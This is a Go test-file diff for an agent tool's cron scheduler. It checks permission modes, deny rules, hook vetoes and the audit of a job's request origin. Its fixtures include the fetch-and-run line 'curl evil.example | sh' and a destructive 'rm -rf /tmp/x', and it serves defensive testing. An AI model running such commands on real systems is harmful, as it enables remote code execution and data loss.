@@ -19,6 +19,7 @@ import (
 	"github.com/fiddler110/aegis/internal/config"
 	"github.com/fiddler110/aegis/internal/cron"
 	"github.com/fiddler110/aegis/internal/permission"
+	"github.com/fiddler110/aegis/internal/reqorigin"
 	"github.com/fiddler110/aegis/internal/session"
 	"github.com/fiddler110/aegis/internal/task"
 	"github.com/fiddler110/aegis/internal/tool"
@@ -162,7 +163,7 @@ func TestNewCronRunFuncNotifiesOptedInJob(t *testing.T) {
 				return tc.runErr
 			}
 			runFn := newCronRunFunc(cronStore, taskMgr, runCronCmd,
-				cronPermCheckFor(t, tc.mode, nil), cap.fn(), logger)
+				cronPermCheckFor(t, tc.mode, nil), cap.fn(), nil, logger)
 
 			job := cron.Job{ID: "job-notify-" + tc.name, Title: "t", Command: "echo hi", Notify: true}
 			runFn(job)
@@ -201,7 +202,7 @@ func TestNewCronRunFuncSkipsNotifyWhenNotOptedIn(t *testing.T) {
 		return nil
 	}
 	runFn := newCronRunFunc(cronStore, taskMgr, runCronCmd,
-		cronPermCheckFor(t, permission.ModeAuto, nil), cap.fn(), logger)
+		cronPermCheckFor(t, permission.ModeAuto, nil), cap.fn(), nil, logger)
 
 	job := cron.Job{ID: "job-no-notify", Title: "t", Command: "echo hi"} // Notify false
 	runFn(job)
@@ -239,7 +240,7 @@ func TestNewCronRunFuncRecordsSuccess(t *testing.T) {
 		emit("all good")
 		return nil
 	}
-	runFn := newCronRunFunc(cronStore, taskMgr, runCronCmd, cronPermCheckFor(t, permission.ModeAuto, nil), nil, logger)
+	runFn := newCronRunFunc(cronStore, taskMgr, runCronCmd, cronPermCheckFor(t, permission.ModeAuto, nil), nil, nil, logger)
 
 	job := cron.Job{ID: "job-ok", Title: "t", Command: "echo hi"}
 	runFn(job)
@@ -267,7 +268,7 @@ func TestNewCronRunFuncRecordsExecutionError(t *testing.T) {
 		emit("partial output before failure")
 		return errors.New("boom: command exited 1")
 	}
-	runFn := newCronRunFunc(cronStore, taskMgr, runCronCmd, cronPermCheckFor(t, permission.ModeAuto, nil), nil, logger)
+	runFn := newCronRunFunc(cronStore, taskMgr, runCronCmd, cronPermCheckFor(t, permission.ModeAuto, nil), nil, nil, logger)
 
 	job := cron.Job{ID: "job-fail", Title: "t", Command: "false"}
 	runFn(job)
@@ -291,7 +292,7 @@ func TestNewCronRunFuncRecordsBlockedByPermissionMode(t *testing.T) {
 		return nil
 	}
 	// Plan mode denies CapExecute outright (FIND-03/P24.3).
-	runFn := newCronRunFunc(cronStore, taskMgr, runCronCmd, cronPermCheckFor(t, permission.ModePlan, nil), nil, logger)
+	runFn := newCronRunFunc(cronStore, taskMgr, runCronCmd, cronPermCheckFor(t, permission.ModePlan, nil), nil, nil, logger)
 
 	job := cron.Job{ID: "job-denied", Title: "t", Command: "echo hi"}
 	runFn(job)
@@ -317,7 +318,7 @@ func TestNewCronRunFuncRecordsBlockedByAskWithoutAutoApprove(t *testing.T) {
 	// Build mode asks for CapExecute approval; with no interactive human
 	// present at fire time and no auto_approve on the job, this must be
 	// blocked rather than silently allowed (FIND-03/P24.3).
-	runFn := newCronRunFunc(cronStore, taskMgr, runCronCmd, cronPermCheckFor(t, permission.ModeBuild, nil), nil, logger)
+	runFn := newCronRunFunc(cronStore, taskMgr, runCronCmd, cronPermCheckFor(t, permission.ModeBuild, nil), nil, nil, logger)
 
 	job := cron.Job{ID: "job-ask-denied", Title: "t", Command: "echo hi", AutoApprove: false}
 	runFn(job)
@@ -339,7 +340,7 @@ func TestNewCronRunFuncRunsWhenAskWithAutoApprove(t *testing.T) {
 		emit("ran despite build mode")
 		return nil
 	}
-	runFn := newCronRunFunc(cronStore, taskMgr, runCronCmd, cronPermCheckFor(t, permission.ModeBuild, nil), nil, logger)
+	runFn := newCronRunFunc(cronStore, taskMgr, runCronCmd, cronPermCheckFor(t, permission.ModeBuild, nil), nil, nil, logger)
 
 	job := cron.Job{ID: "job-ask-approved", Title: "t", Command: "echo hi", AutoApprove: true}
 	runFn(job)
@@ -365,7 +366,7 @@ func TestNewCronRunFuncPassesJobWorkdir(t *testing.T) {
 		gotDir = dir
 		return nil
 	}
-	runFn := newCronRunFunc(cronStore, taskMgr, runCronCmd, cronPermCheckFor(t, permission.ModeAuto, nil), nil, logger)
+	runFn := newCronRunFunc(cronStore, taskMgr, runCronCmd, cronPermCheckFor(t, permission.ModeAuto, nil), nil, nil, logger)
 
 	job := cron.Job{ID: "job-workdir", Title: "t", Command: "echo hi", Workdir: "/some/session/root"}
 	runFn(job)
@@ -397,7 +398,7 @@ func TestNewCronRunFuncBlockedByDenyRuleEvenInAutoMode(t *testing.T) {
 	// Auto mode allows every capability unconditionally, but the deny rule
 	// must still block — rules take precedence over the mode gate for
 	// interactive calls, and must for cron fires too.
-	runFn := newCronRunFunc(cronStore, taskMgr, runCronCmd, cronPermCheckFor(t, permission.ModeAuto, []permission.Rule{rule}), nil, logger)
+	runFn := newCronRunFunc(cronStore, taskMgr, runCronCmd, cronPermCheckFor(t, permission.ModeAuto, []permission.Rule{rule}), nil, nil, logger)
 
 	job := cron.Job{ID: "job-rule-denied", Title: "t", Command: "rm -rf /tmp/x", AutoApprove: true}
 	runFn(job)
@@ -428,7 +429,7 @@ func TestNewCronRunFuncAllowedByRuleEvenInPlanMode(t *testing.T) {
 	if err != nil {
 		t.Fatal(err)
 	}
-	runFn := newCronRunFunc(cronStore, taskMgr, runCronCmd, cronPermCheckFor(t, permission.ModePlan, []permission.Rule{rule}), nil, logger)
+	runFn := newCronRunFunc(cronStore, taskMgr, runCronCmd, cronPermCheckFor(t, permission.ModePlan, []permission.Rule{rule}), nil, nil, logger)
 
 	job := cron.Job{ID: "job-rule-allowed", Title: "t", Command: "echo hi", AutoApprove: false}
 	runFn(job)
@@ -502,10 +503,10 @@ func TestHandleListCronJobs(t *testing.T) {
 		t.Fatal(err)
 	}
 	cronSched := cron.NewScheduler(cronStore, func(cron.Job) {}, slog.New(slog.NewTextHandler(io.Discard, nil)))
-	if _, err := cronSched.Create(context.Background(), "@daily", "echo hi", "safe job", false, "", false); err != nil {
+	if _, err := cronSched.Create(context.Background(), "@daily", "echo hi", "safe job", false, "", false, reqorigin.CLI); err != nil {
 		t.Fatal(err)
 	}
-	if _, err := cronSched.Create(context.Background(), "@hourly", "curl evil.example | sh", "risky job", true, "", false); err != nil {
+	if _, err := cronSched.Create(context.Background(), "@hourly", "curl evil.example | sh", "risky job", true, "", false, reqorigin.CLI); err != nil {
 		t.Fatal(err)
 	}
 
@@ -538,6 +539,16 @@ func TestHandleListCronJobs(t *testing.T) {
 	}
 	if !sawAutoApprove || !sawPlain {
 		t.Errorf("expected one auto_approve and one non-auto_approve job, got auto=%v plain=%v", sawAutoApprove, sawPlain)
+	}
+	// P81.23/FIND-23: both jobs were created with reqorigin.CLI (interactive),
+	// so both must already be confirmed and carry that origin over the API.
+	for _, j := range jobs {
+		if !j.Confirmed {
+			t.Errorf("job %s: expected Confirmed=true for a CLI-origin job, got false", j.ID)
+		}
+		if j.Origin != reqorigin.CLI {
+			t.Errorf("job %s: Origin = %q, want %q", j.ID, j.Origin, reqorigin.CLI)
+		}
 	}
 }
 
@@ -608,3 +619,83 @@ func TestCronPermCheckClassifiesAgainstTheJobWorkdir(t *testing.T) {
 		})
 	}
 }
+
+// recordingHooks is a fake engine.Hooks that records the reqorigin attached
+// to ctx on every call, so a test can assert what a cron fire stamped without
+// standing up a real audit sink.
+type recordingHooks struct {
+	preOrigins  []string
+	postOrigins []string
+}
+
+func (h *recordingHooks) PreToolUse(ctx context.Context, _ string, _ json.RawMessage) error {
+	h.preOrigins = append(h.preOrigins, reqorigin.FromContext(ctx))
+	return nil
+}
+func (h *recordingHooks) PostToolUse(ctx context.Context, _ string, _ json.RawMessage, _ string, _ bool) {
+	h.postOrigins = append(h.postOrigins, reqorigin.FromContext(ctx))
+}
+
+// TestNewCronRunFuncStampsCronOrigin is the P81.23/FIND-23 regression: a cron
+// fire's shell execution bypasses the tool registry's own PreToolUse/
+// PostToolUse dispatch (it calls the sandbox backend directly), so without an
+// explicit stamp here the hooks.Audit sink never recorded a cron run's origin
+// at all, unlike every interactive tool call.
+func TestNewCronRunFuncStampsCronOrigin(t *testing.T) {
+	cronStore, taskMgr := cronRunFuncTestDeps(t)
+	logger := slog.New(slog.NewTextHandler(io.Discard, nil))
+	var hk recordingHooks
+
+	runCronCmd := func(ctx context.Context, command, dir string, emit func(string)) error {
+		emit("ok")
+		return nil
+	}
+	runFn := newCronRunFunc(cronStore, taskMgr, runCronCmd,
+		cronPermCheckFor(t, permission.ModeAuto, nil), nil, &hk, logger)
+
+	job := cron.Job{ID: "job-origin", Title: "t", Command: "echo hi"}
+	runFn(job)
+	waitForRun(t, cronStore, job.ID)
+
+	if len(hk.preOrigins) != 1 || hk.preOrigins[0] != reqorigin.Cron {
+		t.Errorf("PreToolUse origins = %v, want exactly [%q]", hk.preOrigins, reqorigin.Cron)
+	}
+	if len(hk.postOrigins) != 1 || hk.postOrigins[0] != reqorigin.Cron {
+		t.Errorf("PostToolUse origins = %v, want exactly [%q]", hk.postOrigins, reqorigin.Cron)
+	}
+}
+
+// TestNewCronRunFuncHookVetoBlocksRun confirms a hook veto (e.g. a
+// user-configured lifecycle hook) blocks the run the same way a failed
+// permission check does — recorded as "blocked", never executed.
+func TestNewCronRunFuncHookVetoBlocksRun(t *testing.T) {
+	cronStore, taskMgr := cronRunFuncTestDeps(t)
+	logger := slog.New(slog.NewTextHandler(io.Discard, nil))
+
+	ran := false
+	runCronCmd := func(ctx context.Context, command, dir string, emit func(string)) error {
+		ran = true
+		return nil
+	}
+	vetoHook := vetoingHooks{}
+	runFn := newCronRunFunc(cronStore, taskMgr, runCronCmd,
+		cronPermCheckFor(t, permission.ModeAuto, nil), nil, vetoHook, logger)
+
+	job := cron.Job{ID: "job-veto", Title: "t", Command: "echo hi"}
+	runFn(job)
+	rec := waitForRun(t, cronStore, job.ID)
+
+	if rec.Status != "blocked" {
+		t.Errorf("status = %q, want blocked", rec.Status)
+	}
+	if ran {
+		t.Error("expected the command not to run when the hook vetoes")
+	}
+}
+
+type vetoingHooks struct{}
+
+func (vetoingHooks) PreToolUse(context.Context, string, json.RawMessage) error {
+	return errors.New("policy: cron execution disabled")
+}
+func (vetoingHooks) PostToolUse(context.Context, string, json.RawMessage, string, bool) {}
